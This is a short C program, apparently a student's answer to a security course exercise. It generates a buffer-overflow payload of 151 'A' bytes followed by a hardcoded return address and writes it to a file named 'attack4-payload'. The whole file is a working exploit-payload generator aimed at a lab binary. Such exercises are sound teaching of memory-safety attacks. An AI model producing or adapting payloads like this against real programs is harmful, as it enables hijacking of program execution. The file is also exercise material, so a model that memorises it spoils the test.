#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util-program.h"


int main(int argc, char **argv)
{
    /* YOUR CODE: Generate buf appropriately */

	int buffer_length=155;
   char buffer[buffer_length];

   int i=0;
        for (i=0;i< buffer_length-4;i++){
                buffer[i]='A';
        }
  
   buffer[151]='\x3b';
   buffer[152]='\x86';
   buffer[153]='\x04';
   buffer[154]='\x08';


    write_to_file( "attack4-payload", buffer , buffer_length , FILE_CLEAR );
    exit(0);
}
